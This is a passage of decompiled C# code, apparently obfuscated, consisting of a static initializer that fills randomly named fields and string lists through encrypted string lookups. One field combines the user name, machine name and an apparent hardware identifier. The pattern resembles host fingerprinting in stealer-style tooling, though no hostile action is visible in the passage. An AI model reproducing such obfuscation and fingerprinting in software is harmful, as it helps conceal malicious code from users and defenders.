			DRlXtEGdcAr(getString_0(107456065)),
			DRlXtEGdcAr(getString_0(107455988)),
			DRlXtEGdcAr(getString_0(107455971)),
			DRlXtEGdcAr(getString_0(107455914)),
			DRlXtEGdcAr(getString_0(107455881)),
			DRlXtEGdcAr(getString_0(107455292)),
			DRlXtEGdcAr(getString_0(107455259)),
			DRlXtEGdcAr(getString_0(107455218)),
			DRlXtEGdcAr(getString_0(107459869)),
			DRlXtEGdcAr(getString_0(107455971)),
			DRlXtEGdcAr(getString_0(107455209)),
			DRlXtEGdcAr(getString_0(107455180)),
			DRlXtEGdcAr(getString_0(107455151)),
			DRlXtEGdcAr(getString_0(107455582)),
			DRlXtEGdcAr(getString_0(107455541)),
			DRlXtEGdcAr(getString_0(107455480)),
			DRlXtEGdcAr(getString_0(107455439)),
			DRlXtEGdcAr(getString_0(107455378)),
			DRlXtEGdcAr(getString_0(107455345)),
			DRlXtEGdcAr(getString_0(107454792)),
			DRlXtEGdcAr(getString_0(107454763)),
			DRlXtEGdcAr(getString_0(107454686)),
			DRlXtEGdcAr(getString_0(107454621)),
			DRlXtEGdcAr(getString_0(107454588)),
			DRlXtEGdcAr(getString_0(107455087)),
			DRlXtEGdcAr(getString_0(107454994)),
			DRlXtEGdcAr(getString_0(107454961)),
			DRlXtEGdcAr(getString_0(107454948)),
			DRlXtEGdcAr(getString_0(107454883)),
			DRlXtEGdcAr(getString_0(107454850)),
			DRlXtEGdcAr(getString_0(107454265)),
			DRlXtEGdcAr(getString_0(107454248)),
			DRlXtEGdcAr(getString_0(107460508)),
			DRlXtEGdcAr(getString_0(107454219)),
			DRlXtEGdcAr(getString_0(107454130)),
			DRlXtEGdcAr(getString_0(107454121)),
			DRlXtEGdcAr(getString_0(107454556)),
			DRlXtEGdcAr(getString_0(107454515)),
			DRlXtEGdcAr(getString_0(107454502)),
			DRlXtEGdcAr(getString_0(107454441)),
			DRlXtEGdcAr(getString_0(107454360)),
			DRlXtEGdcAr(getString_0(107454343)),
			DRlXtEGdcAr(getString_0(107453774)),
			DRlXtEGdcAr(getString_0(107453685)),
			DRlXtEGdcAr(getString_0(107453672)),
			DRlXtEGdcAr(getString_0(107453599)),
			DRlXtEGdcAr(getString_0(107453574)),
			DRlXtEGdcAr(getString_0(107460483)),
			DRlXtEGdcAr(getString_0(107453981)),
			DRlXtEGdcAr(getString_0(107453952)),
			DRlXtEGdcAr(getString_0(107453919)),
			DRlXtEGdcAr(getString_0(107453878)),
			DRlXtEGdcAr(getString_0(107453849)),
			DRlXtEGdcAr(getString_0(107460589)),
			DRlXtEGdcAr(getString_0(107453840)),
			DRlXtEGdcAr(getString_0(107453247)),
			DRlXtEGdcAr(getString_0(107453250)),
			DRlXtEGdcAr(getString_0(107458312)),
			DRlXtEGdcAr(getString_0(107453217)),
			DRlXtEGdcAr(getString_0(107453250)),
			DRlXtEGdcAr(getString_0(107453188)),
			DRlXtEGdcAr(getString_0(107453159)),
			DRlXtEGdcAr(getString_0(107453130)),
			DRlXtEGdcAr(getString_0(107453049)),
			DRlXtEGdcAr(getString_0(107453544)),
			DRlXtEGdcAr(getString_0(107453471)),
			DRlXtEGdcAr(getString_0(107453442)),
			DRlXtEGdcAr(getString_0(107453413)),
			DRlXtEGdcAr(getString_0(107453340)),
			DRlXtEGdcAr(getString_0(107453327)),
			DRlXtEGdcAr(getString_0(107452770)),
			DRlXtEGdcAr(getString_0(107452737)),
			DRlXtEGdcAr(getString_0(107452680)),
			DRlXtEGdcAr(getString_0(107452603)),
			DRlXtEGdcAr(getString_0(107452578)),
			DRlXtEGdcAr(getString_0(107452545)),
			DRlXtEGdcAr(getString_0(107452984)),
			DRlXtEGdcAr(getString_0(107452955)),
			DRlXtEGdcAr(getString_0(107452894)),
			DRlXtEGdcAr(getString_0(107452861)),
			DRlXtEGdcAr(getString_0(107452836)),
			DRlXtEGdcAr(getString_0(107452251)),
			DRlXtEGdcAr(getString_0(107452234)),
			DRlXtEGdcAr(getString_0(107452201)),
			DRlXtEGdcAr(getString_0(107452120)),
			DRlXtEGdcAr(getString_0(107452107)),
			DRlXtEGdcAr(getString_0(107452026)),
			DRlXtEGdcAr(getString_0(107452525)),
			DRlXtEGdcAr(getString_0(107452444)),
			DRlXtEGdcAr(getString_0(107452411)),
			DRlXtEGdcAr(getString_0(107452370)),
			DRlXtEGdcAr(getString_0(107452361)),
			DRlXtEGdcAr(getString_0(107452284)),
			DRlXtEGdcAr(getString_0(107455541)),
			DRlXtEGdcAr(getString_0(107451739)),
			DRlXtEGdcAr(getString_0(107451698)),
			DRlXtEGdcAr(getString_0(107451641)),
			DRlXtEGdcAr(getString_0(107451612)),
			DRlXtEGdcAr(getString_0(107451579)),
			DRlXtEGdcAr(getString_0(107451546)),
			DRlXtEGdcAr(getString_0(107451529)),
			DRlXtEGdcAr(getString_0(107452012)),
			DRlXtEGdcAr(getString_0(107451935)),
			DRlXtEGdcAr(getString_0(107451890)),
			DRlXtEGdcAr(getString_0(107451881)),
			DRlXtEGdcAr(getString_0(107451824)),
			DRlXtEGdcAr(getString_0(107451231)),
			DRlXtEGdcAr(getString_0(107451234)),
			DRlXtEGdcAr(getString_0(107451157))
		};
		xEsusUJpPleGEu = new List<string>
		{
			DRlXtEGdcAr(getString_0(107451148)),
			DRlXtEGdcAr(getString_0(107451067)),
			DRlXtEGdcAr(getString_0(107451050)),
			DRlXtEGdcAr(getString_0(107451481)),
			DRlXtEGdcAr(getString_0(107451464)),
			DRlXtEGdcAr(getString_0(107451399)),
			DRlXtEGdcAr(getString_0(107451290)),
			DRlXtEGdcAr(getString_0(107450717))
		};
		WcWfRegXKTTamv = new List<string>
		{
			DRlXtEGdcAr(getString_0(107450692)),
			DRlXtEGdcAr(getString_0(107450659)),
			DRlXtEGdcAr(getString_0(107450582)),
			DRlXtEGdcAr(getString_0(107450565)),
			DRlXtEGdcAr(getString_0(107450532)),
			DRlXtEGdcAr(getString_0(107450963)),
			DRlXtEGdcAr(getString_0(107450950)),
			DRlXtEGdcAr(getString_0(107450917)),
			DRlXtEGdcAr(getString_0(107450884)),
			DRlXtEGdcAr(getString_0(107450851)),
			DRlXtEGdcAr(getString_0(107450818)),
			DRlXtEGdcAr(getString_0(107450785)),
			DRlXtEGdcAr(getString_0(107450200)),
			DRlXtEGdcAr(getString_0(107450191)),
			DRlXtEGdcAr(getString_0(107450146)),
			DRlXtEGdcAr(getString_0(107450113)),
			DRlXtEGdcAr(getString_0(107450040)),
			DRlXtEGdcAr(getString_0(107450007)),
			DRlXtEGdcAr(getString_0(107449998)),
			DRlXtEGdcAr(getString_0(107450469)),
			DRlXtEGdcAr(getString_0(107450436)),
			DRlXtEGdcAr(getString_0(107450363)),
			DRlXtEGdcAr(getString_0(107450330)),
			DRlXtEGdcAr(getString_0(107450692)),
			DRlXtEGdcAr(getString_0(107450289)),
			DRlXtEGdcAr(getString_0(107450280)),
			DRlXtEGdcAr(getString_0(107449691)),
			DRlXtEGdcAr(getString_0(107449658)),
			DRlXtEGdcAr(getString_0(107449617)),
			DRlXtEGdcAr(getString_0(107449608)),
			DRlXtEGdcAr(getString_0(107449575)),
			DRlXtEGdcAr(getString_0(107449502)),
			DRlXtEGdcAr(getString_0(107449461)),
			DRlXtEGdcAr(getString_0(107450659)),
			DRlXtEGdcAr(getString_0(107449964)),
			DRlXtEGdcAr(getString_0(107450582)),
			DRlXtEGdcAr(getString_0(107449931)),
			DRlXtEGdcAr(getString_0(107449898)),
			DRlXtEGdcAr(getString_0(107449857)),
			DRlXtEGdcAr(getString_0(107449792)),
			DRlXtEGdcAr(getString_0(107449751)),
			DRlXtEGdcAr(getString_0(107449742)),
			DRlXtEGdcAr(getString_0(107449197)),
			DRlXtEGdcAr(getString_0(107449164)),
			DRlXtEGdcAr(getString_0(107449123)),
			DRlXtEGdcAr(getString_0(107449050)),
			DRlXtEGdcAr(getString_0(107449009))
		};
		RWyHSlEBUZLMaY = new List<string>
		{
			DRlXtEGdcAr(XVYVEQqAqPwoG(getString_0(107449000))),
			DRlXtEGdcAr(getString_0(107449431)),
			DRlXtEGdcAr(getString_0(107449338)),
			DRlXtEGdcAr(getString_0(107449241)),
			DRlXtEGdcAr(getString_0(107448636)),
			DRlXtEGdcAr(getString_0(107448539)),
			DRlXtEGdcAr(getString_0(107448446)),
			DRlXtEGdcAr(getString_0(107448861)),
			DRlXtEGdcAr(getString_0(107448768)),
			DRlXtEGdcAr(getString_0(107448159)),
			DRlXtEGdcAr(getString_0(107448098)),
			DRlXtEGdcAr(getString_0(107448001)),
			DRlXtEGdcAr(getString_0(107448420)),
			DRlXtEGdcAr(XVYVEQqAqPwoG(getString_0(107449000)))
		};
		jRkHacbmdHPVi = DRlXtEGdcAr(getString_0(107448323));
		nRyHvPuGTGYjWsbq = new List<string>
		{
			DRlXtEGdcAr(getString_0(107448178)),
			DRlXtEGdcAr(getString_0(107447504)),
			DRlXtEGdcAr(getString_0(107447822)),
			DRlXtEGdcAr(getString_0(107447116)),
			DRlXtEGdcAr(getString_0(107446922)),
			DRlXtEGdcAr(getString_0(107447240))
		};
		oWIHAvJtbtFMU = new List<string>
		{
			DRlXtEGdcAr(getString_0(107446534)),
			DRlXtEGdcAr(getString_0(107446473)),
			DRlXtEGdcAr(getString_0(107446412))
		};
		tBGeLHoFvcy = getString_0(107397156);
		qCxjqMREBDIxz = getString_0(107397156);
		RaafVLqcghpsV = new DateTime(2000, 1, 1);
		pplUelDGHuSK = new DateTime(2100, 1, 1);
		tiRzeTZfFqxZgzU = getString_0(107396727);
		WsRteVdKTkKpED = getString_0(107462118);
		xstAsCXBKaQC = getString_0(107397156);
		iZDDkxJigpgZ = getString_0(107397156);
		AEUOIlHtMhD = getString_0(107397156);
		rsDBKVhSeGajZ = getString_0(107396727);
		hRpKPprDobNK = getString_0(107397156);
		NgNETKMlSjJng = getString_0(107397156);
		chWKKaOgedu = new List<string>
		{
			getString_0(107391732),
			getString_0(107385789),
			getString_0(107412144),
			getString_0(107392783)
		};
		fWqlqykUBEVkds = getString_0(107397156);
		wQqHVBAZmaYqT = getString_0(107396639);
		XiehLKdjkwhtY = getString_0(107397156);
		VBShylEsNUYfMi = getString_0(107397156);
		HLBdOPVdAJ = getString_0(107397156);
		yMxnBnnzZwyRqt = string.Empty;
		gkNjBSIByXQLy = getString_0(107397156);
		WrETenYYrsTSs = getString_0(107396727);
		pdgCKKhrrBHZnX = getString_0(107396727);
		jmjaTLfeuxPg = getString_0(107446863);
		lTtDZSKOub = getString_0(107446798);
		WKkmdZcykHMfX = getString_0(107397156);
		DRKkoXveZyqfNNiQ = getString_0(107396727);
		wqbriLFZDnLpH = getString_0(107397156);
		pOdPmMHlUjg = getString_0(107397156);
		cesTZZkUdNCNFeq = getString_0(107397156);
		XyKjfboizG = getString_0(107367639);
		hDmutTgGdvYmUFmT = getString_0(107397156);
		KxRJFZSBGpiT = getString_0(107397156);
		eUsvqxZnDWYVdQ = getString_0(107478496);
		dMyOPFWbNnAP = getString_0(107397156);
		ODgCciaivko = getString_0(107397156);
		mgesYTxzqcBoi = getString_0(107396727);
		flvVRSkBnkX = getString_0(107397156);
		jFdtIHbULOcM = getString_0(107478507);
		qAJMAzUrnidgbg = getString_0(107396727);
		dVeczuFsmFhaWQ = getString_0(107396727);
		AhVMMnudDD = getString_0(107397156);
		NQNKoSWmegHO = getString_0(107397156);
		pNHGfyiizpSvpI = new string[0];
		HTIndamVwXrIE = getString_0(107396727);
		xIEYdRogbJjk = true;
		FFKPaIgUHZxbh = getString_0(107396727);
		DfXjMyctTQk = true;
		WnxZrIzpuZegR = false;
		ZHiPyHFLGBwCsE = false;
		QufKUxajeWOAYn = false;
		GqXvKuGfqke = getString_0(107478462);
		qphnWLJhmOUolrV = false;
		lljRpMchpQANYhL = false;
		RNdzTDKHNMZhNO = false;
		cgnsxMDVCroTQ = false;
		tEHYMAajqyQN = true;
		TajfgxbHDQDsSZ = getString_0(107478473) + Environment.UserName + getString_0(107478428) + Environment.MachineName + getString_0(107478439) + XCKLADindvJZ.zhDvisqDYmjg() + getString_0(107478434);
		IrtcteVbDJMbKD = false;
		zEEvkNDfGVVq = new Stopwatch();
		CfPnwVRgYaXy = 0;
		eHvSFFSwlBBvD = 0;
		JaGTzvkqDZS = false;
		WorQZGhMrwJuixubIO = getString_0(107478393) + XCKLADindvJZ.zhDvisqDYmjg() + getString_0(107478416);
		dJEmgfWDQYEuJ = new string[1] { getString_0(107478411) };
		IgXzUHzesBra = new List<string>();
		rrxeEOhCBbfFLgvV = 0;
		LQjZyQoCuAgVY = new List<string>();
		uKEflmkVFgJo = new List<string>();
		CJBNHOpeQKJec = new List<string>();
	}
}
